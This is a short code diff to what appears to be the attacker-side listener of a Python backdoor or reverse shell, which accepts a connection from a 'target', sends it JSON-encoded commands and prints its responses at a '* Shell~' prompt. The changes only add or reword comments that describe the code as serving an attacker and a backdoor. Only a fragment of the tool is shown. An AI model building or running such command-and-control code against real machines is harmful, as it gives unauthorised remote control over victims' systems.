@@ -14,10 +14,12 @@ server.listen(1)
 target, client_addr = server.accept()
 print(f'[+] {client_addr} connected')
 
+#send command from backdoor
 def send_command(data):
     jsondata = json.dumps(data)
     target.send(jsondata.encode())
 
+#wait for a response from backdoor
 def receive_response():
     data = ''
     while True:
@@ -27,8 +29,7 @@ def receive_response():
         except ValueError:
             continue
 
-
-# send commands and receive output in loop
+# takes input commands from attacker in a loop
 def target_communication():
     while True:
         command = input('* Shell~%s: ' % str(ip))
